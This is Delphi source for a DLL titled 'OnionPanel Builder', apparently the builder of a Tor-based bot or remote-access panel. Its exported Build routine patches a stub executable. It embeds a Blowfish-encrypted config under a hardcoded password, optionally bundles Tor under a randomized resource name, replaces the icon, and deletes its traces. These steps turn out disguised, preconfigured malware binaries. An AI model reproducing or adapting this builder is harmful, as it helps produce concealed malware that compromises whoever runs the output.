library Builder;

uses
  Windows, SysUtils, Classes, INIFiles, ShellAPI,
  uTPLb_CryptographicLibrary, uTPLb_Codec;

{$R *.res}

const
  Version = 'OnionPanel Builder v1.0.0 by Raffy, 2019';
  Dict    = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@%()[]_-';

var
  F: TINIFile;

function RandomStr(L: Word): String;
var
  I: Word;
Begin
  Result := '';
  for I := 1 to L do
    Result := Result + Dict[Random(Length(Dict))+1];
End;

function ExecAndWait(FileName, Params: String): Boolean;
var
  exInfo: TShellExecuteInfo;
  Ph: DWORD;
begin
  FillChar(exInfo, SizeOf(exInfo), 0);
  with exInfo do
  begin
    cbSize := SizeOf(exInfo);
    fMask := SEE_MASK_NOCLOSEPROCESS or SEE_MASK_FLAG_DDEWAIT;
    Wnd := GetActiveWindow();
    exInfo.lpVerb := 'open';
    exInfo.lpParameters := PChar(Params);
    lpFile := PChar(FileName);
    nShow := SW_SHOWNORMAL;
  end;
  if ShellExecuteEx(@exInfo) then
    Ph := exInfo.hProcess
  else begin
    Result := False;
    exit;
  end;
  while WaitForSingleObject(exInfo.hProcess, 50) <> WAIT_OBJECT_0 do
    Sleep(1);
  CloseHandle(Ph);
  Result := True;
end;

function GetPassword: String;
Begin
  Result := 'GurRaqVfPbzvat';
End;

procedure Crypt(M: TMemoryStream; Encrypt: Boolean = True);
var
  Codec: TCodec;
  Lib: TCryptographicLibrary;
  V: TMemoryStream;
Begin
  Codec := TCodec.Create(Nil);
  Lib := TCryptographicLibrary.Create(Nil);
  V := TMemoryStream.Create;
  try
    Codec.CryptoLibrary := Lib;
    Codec.StreamCipherID := 'native.StreamToBlock';
    Codec.BlockCipherId := 'native.Blowfish';
    Codec.ChainModeId := 'native.CBC';
    Codec.Password := GetPassword;
    if Encrypt then
      Codec.EncryptStream(M, V)
    else
      Codec.DecryptStream(V, M);
    M.LoadFromStream(V);
  finally
    Codec.Free;
    Lib.Free;
    V.Free;
  end;
End;

procedure AddResource(H: THandle; FileName, ResName: String;
                      Encrypt: Boolean = False);
var
  M: TMemoryStream;
Begin
  M := TMemoryStream.Create;
  M.LoadFromFile(FileName);
  if Encrypt then
    Crypt(M);
  M.Position := 0;
  UpdateResource(H, RT_RCDATA, PChar(ResName), 0, M.Memory, M.Size);
  M.Free;
End;

procedure CreateConfig; stdcall;
Begin
  F := TINIFile.Create(GetCurrentDir + '\Builder\Temp.tmp');
End;

procedure WriteConfig(Section, Key, Value: PChar); stdcall;
Begin
  F.WriteString(Section, Key, Value);
End;

procedure ChangeIcon(Input, Icon: String);
Begin
  ExecAndWait('Builder\ResTool.exe', '-open '+Input+' -save '+Input+' -action '+
              'addoverwrite -res "'+Icon+'" -mask ICONGROUP,MAINICON,0');
End;

function Build(Input, Output, Icon: PChar; T: Boolean): Boolean; stdcall;
var
  TorRes: String;
  H:      THandle;
Begin
  Result := False;
  try
    H := BeginUpdateResource(Input, False);
    if H < 1 then raise Exception.Create('Unable to open standard binary.');
    if T then Begin
      TorRes := RandomStr(8);
      WriteConfig('Install', 'TorRes', PChar(TorRes));
      AddResource(H, 'Builder\Tor.zip', TorRes);
    End;
    F.Free;
    AddResource(H, 'Builder\Temp.tmp', 'Config', True);
    EndUpdateResource(H, False);
    if Icon <> '' then
      ChangeIcon(Input, Icon);
    if Not(CopyFile(PChar(GetCurrentDir+'\'+Input), Output, False)) then
      raise Exception.Create('Failed to copy the binary.');
    DeleteFile('Builder\Temp.tmp');
    DeleteFile(Input);
    DeleteFile('ResTool.ini');
    Result := True;
  except on E: Exception do
    MessageBox(0, PChar(E.ClassName+' - '+E.Message), 'Builder', MB_ICONERROR);
  end;
End;

exports
  CreateConfig,
  WriteConfig,
  Build;

begin
  Randomize;
end.
